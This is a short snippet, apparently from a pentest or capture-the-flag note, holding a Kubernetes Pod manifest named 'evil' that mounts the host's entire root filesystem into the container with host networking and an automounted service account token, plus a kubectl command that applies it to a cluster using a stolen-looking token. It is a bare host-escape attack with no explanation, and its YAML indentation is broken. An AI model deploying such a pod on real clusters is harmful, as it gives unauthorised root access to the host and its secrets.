

```yaml
apiVersion: v1
kind: Pod
metadata:
	name: evil
namespace: default
spec:
	containers:
		- name: evilpod
		image: evil:1.14.2
		volumeMounts:
		- mountPath: /root
		name: mount-root-into-mnt
	volumes:
		- name: mount-root-into-mnt
		hostPath:
			path: /
	automountServiceAccountToken: true
	hostNetwork: true
```

```bash
kubectl --token=$token --certificate-authority=ca.crt \
--server=https://$IP:$API_IP apply -f pod.yaml 
```
